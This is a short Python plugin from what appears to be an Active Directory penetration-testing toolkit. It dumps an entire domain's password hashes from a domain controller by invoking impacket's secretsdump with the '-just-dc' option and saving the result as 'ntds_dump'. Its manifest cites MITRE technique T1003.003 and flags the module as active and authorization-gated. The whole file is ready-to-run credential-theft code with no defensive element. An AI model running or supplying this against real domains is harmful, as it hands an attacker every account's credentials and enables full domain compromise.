"""NTDS.dit extraction — domain credential dump via VSS or DRSUAPI."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.credential.ntds_extract.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["credential_extraction", "vss_snapshot"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.003"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    dc_ip = getattr(args, "dc_ip", None) or target

    print(f"[*] NTDS.dit Extraction: {dc_ip or cred.domain}")

    import subprocess
    import shutil
    secretsdump = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if not secretsdump:
        print("[!] secretsdump.py (impacket) not found")
        return 1

    auth = cred.impacket_auth_string()
    cmd = [secretsdump, auth]
    if dc_ip:
        cmd += ["-target-ip", dc_ip]
    cmd += ["-just-dc", "-outputfile", getattr(args, "output", ".") + "/ntds_dump"]

    print("[*] CMD: {}".format(" ".join(cmd)))
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)
    return result.returncode
